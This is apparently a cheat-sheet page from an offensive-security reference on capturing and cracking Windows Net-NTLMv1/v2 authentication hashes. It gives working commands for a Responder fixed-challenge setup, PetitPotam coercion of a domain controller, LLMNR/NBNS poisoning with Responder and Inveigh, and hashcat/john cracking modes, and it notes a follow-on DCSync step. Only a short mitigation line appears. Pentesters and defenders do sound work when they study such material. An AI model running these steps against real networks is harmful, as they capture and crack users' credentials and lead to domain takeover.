# Hash - Capture and Cracking

## LmCompatibilityLevel

LmCompatibilityLevel is a Windows security setting that determines the level of authentication protocol used between computers. It specifies how Windows handles NTLM and LAN Manager (LM) authentication protocols, impacting how passwords are stored and how authentication requests are processed. The level can range from 0 to 5, with higher levels generally providing more secure authentication methods.

```ps1
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v lmcompatibilitylevel
```

* **Level 0** - Send LM and NTLM response; never use NTLM 2 session security. Clients use LM and NTLM authentication, and never use NTLM 2 session security; domain controllers accept LM, NTLM, and NTLM 2 authentication.
* **Level 1** - Use NTLM 2 session security if negotiated. Clients use LM and NTLM authentication, and use NTLM 2 session security if the server supports it; domain controllers accept LM, NTLM, and NTLM 2 authentication.
* **Level 2** - Send NTLM response only. Clients use only NTLM authentication, and use NTLM 2 session security if the server supports it; domain controllers accept LM, NTLM, and NTLM 2 authentication.
* **Level 3** - Send NTLM 2 response only. Clients use NTLM 2 authentication, and use NTLM 2 session security if the server supports it; domain controllers accept LM, NTLM, and NTLM 2 authentication.
* **Level 4** - Domain controllers refuse LM responses. Clients use NTLM authentication, and use NTLM 2 session security if the server supports it; domain controllers refuse LM authentication (that is, they accept NTLM and NTLM 2).
* **Level 5** - Domain controllers refuse LM and NTLM responses (accept only NTLM 2). Clients use NTLM 2 authentication, use NTLM 2 session security if the server supports it; domain controllers refuse NTLM and LM authentication (they accept only NTLM 2).A client computer can only use one protocol in talking to all servers. You cannot configure it, for example, to use NTLM v2 to connect to Windows 2000-based servers and then to use NTLM to connect to other servers. This is by design.


## Capturing and cracking Net-NTLMv1/NTLMv1 hashes/tokens

> Net-NTLMv1 (NTLMv1) authentication tokens are used for network authentication. They are derived from a challenge/response DES-based algorithm with the user's NT-hash as symetric keys. 

:information_source: Coerce a callback using PetitPotam or SpoolSample on an affected machine and downgrade the authentication to **NetNTLMv1 Challenge/Response authentication**. This uses the outdated encryption method DES to protect the NT/LM Hashes.

**Requirements**:

* `LmCompatibilityLevel = 0x1`: Send LM and NTLM response


**Exploitation**:

* Capturing using [lgandx/Responder](https://github.com/lgandx/Responder): Edit the `/etc/responder/Responder.conf` file to include the magical **1122334455667788** challenge
    ```ps1
    HTTPS = On
    DNS = On
    LDAP = On
    ...
    ; Custom challenge.
    ; Use "Random" for generating a random challenge for each requests (Default)
    Challenge = 1122334455667788
    ```
* Fire Responder: `responder -I eth0 --lm`, if `--disable-ess` is set, extended session security will be disabled for NTLMv1 authentication
* Force a callback:
    ```ps1
    PetitPotam.exe Responder-IP DC-IP # Patched around August 2021
    PetitPotam.py -u Username -p Password -d Domain -dc-ip DC-IP Responder-IP DC-IP # Not patched for authenticated users
    ```
* If you got some `NetNTLMv1 tokens`, you can try to **shuck** them online via [Shuck.Sh](https://shuck.sh/) or locally/on-premise via [ShuckNT](https://github.com/yanncam/ShuckNT/) to get NT-hashes corresponding from [HIBP database](https://haveibeenpwned.com/Passwords). If the NT-hash has previously leaked, the NetNTLMv1 is converted to NT-hash ([pass-the-hash](#pass-the-hash) ready) instantly. The [shucking process](https://www.youtube.com/watch?v=OQD3qDYMyYQ&ab_channel=PasswordVillage) works for any NetNTLMv1 with or without ESS/SSP (challenge != `1122334455667788`) but mainly for user account (plaintext previsouly leaked).
    ```ps1
    # Submit NetNTLMv1 online to https://shuck.sh/get-shucking.php
    # Or shuck them on-premise via ShuckNT script:
    $ php shucknt.php -f tokens-samples.txt -w pwned-passwords-ntlm-reversed-ordered-by-hash-v8.bin
	[...]
	10 hashes-challenges analyzed in 3 seconds, with 8 NT-Hash instantly broken for pass-the-hash and 1 that can be broken via crack.sh for free.
	[INPUT] ycam::ad:DEADC0DEDEADC0DE00000000000000000000000000000000:70C249F75FB6D2C0AC2C2D3808386CCAB1514A2095C582ED:1122334455667788
	        [NTHASH-SHUCKED] 93B3C62269D55DB9CA660BBB91E2BD0B
    ```
* If you got some `NetNTLMv1 tokens`, you can also try to crack them via [Crack.Sh](https://crack.sh/) (cloud service when available, more time and potentially chargeable). For this you need to format them to submit them on [Crack.Sh](https://crack.sh/netntlm/). The Converter of [Shuck.Sh](https://shuck.sh/) can be used to convert format easily.
    ```ps1
    # When there is no-ESS/SSP and the challenge is set to 1122334455667788, it's free (0$):
    username::hostname:response:response:challenge -> NTHASH:response
    NTHASH:F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972

    # When there is ESS/SSP or challenge != 1122334455667788, it's chargeable from $20-$200:
    username::hostname:lmresponse+0padding:ntresponse:challenge -> $NETNTLM$challenge$ntresponse
    $NETNTLM$DEADC0DEDEADC0DE$507E2A2131F4AF4A299D8845DE296F122CA076D49A80476E
    ```
* Finaly, if no [Shuck.Sh](https://shuck.sh/) nor [Crack.Sh](https://crack.sh/) can be used, you can try to break NetNTLMv1 with Hashcat / John The Ripper
    ```ps1
    john --format=netntlm hash.txt
    hashcat -m 5500 -a 3 hash.txt # for NetNTLMv1(-ESS/SSP) to plaintext (for user account)
    hashcat -m 27000 -a 0 hash.txt nthash-wordlist.txt # for NetNTLMv1(-ESS/SSP) to NT-hash (for user and computer account, depending on nthash-wordlist quality)
    hashcat -m 14000 -a 3 inputs.txt --hex-charset -1 /usr/share/hashcat/charsets/DES_full.hcchr ?1?1?1?1?1?1?1?1 # for NetNTLMv1(-ESS/SSP) to DES-keys (KPA-attack) of user/computer account with 100% success rate, then regenerate NT-hash with these DES-keys on https://shuck.sh/converter.php.
    ```
* Now you can DCSync using the Pass-The-Hash with the DC machine account

:warning: NetNTLMv1 with ESS / SSP (Extended Session Security / Security Support Provider) changes the final challenge by adding a new alea (!= `1122334455667788`, so chargeable on [Crack.Sh](https://crack.sh/)).

:warning: NetNTLMv1 format is `login::domain:lmresp:ntresp:clientChall`. If the `lmresp` contains a **0's-padding** this means that the token is protected by **ESS/SSP**.

:warning: NetNTLMv1 final challenge is the Responder's challenge itself (`1122334455667788`) when there is no ESS/SSP. If ESS/SSP is enabled, the final challenge is the first 8 bytes of the MD5 hash from the concatenation of the client challenge and server challenge. The details of the algorithmic generation of a NetNTLMv1 are illustrated on the [Shuck.Sh Generator](https://shuck.sh/generator.php) and detailed in [MISCMag#128](https://connect.ed-diamond.com/misc/misc-128/shuck-hash-before-trying-to-crack-it).

:warning: If you get some tokens from other tools ([hostapd-wpe](https://github.com/OpenSecurityResearch/hostapd-wpe) or [chapcrack](https://github.com/moxie0/chapcrack)) in other formats, like tokens starting with the prefix `$MSCHAPv2$`, `$NETNTLM$` or `$99$`, they correspond to a classic NetNTLMv1 and can be converted from one format to another [here](https://shuck.sh/converter.php).


**Mitigations**: 

* Set the Lan Manager authentication level to `Send NTLMv2 responses only. Refuse LM & NTLM`


## Capturing and cracking Net-NTLMv2/NTLMv2 hashes

If any user in the network tries to access a machine and mistype the IP or the name, Responder will answer for it and ask for the NTLMv2 hash to access the resource. Responder will poison `LLMNR`, `MDNS` and `NETBIOS` requests on the network.

```powershell
# https://github.com/lgandx/Responder
$ sudo ./Responder.py -I eth0 -wfrd -P -v

# https://github.com/Kevin-Robertson/InveighZero
PS > .\inveighzero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y [-Elevated N]

# https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Invoke-Inveigh.ps1
PS > Invoke-Inveigh [-IP '10.10.10.10'] -ConsoleOutput Y -FileOutput Y -NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y
```

Crack the hashes with Hashcat / John The Ripper

```ps1
john --format=netntlmv2 hash.txt
hashcat -m 5600 -a 3 hash.txt
```


## References

* [NTLMv1_Downgrade.md - S3cur3Th1sSh1t - 09/07/2021](https://gist.github.com/S3cur3Th1sSh1t/0c017018c2000b1d5eddf2d6a194b7bb)
* [Practical Attacks against NTLMv1 - Esteban Rodriguez - September 15, 2022](https://trustedsec.com/blog/practical-attacks-against-ntlmv1)
* [Attacking LM/NTLMv1 Challenge/Response Authentication - defence in depth - April 21, 2011](http://www.defenceindepth.net/2011/04/attacking-lmntlmv1-challengeresponse_21.html)
* [CRACKING NETLM/NETNTLMV1 AUTHENTICATION - crack.sh](https://crack.sh/netntlm/)
* [NTLMv1 to NTLM Reversing - evilmog - 03-03-2020](https://hashcat.net/forum/thread-9009-post-47806.html)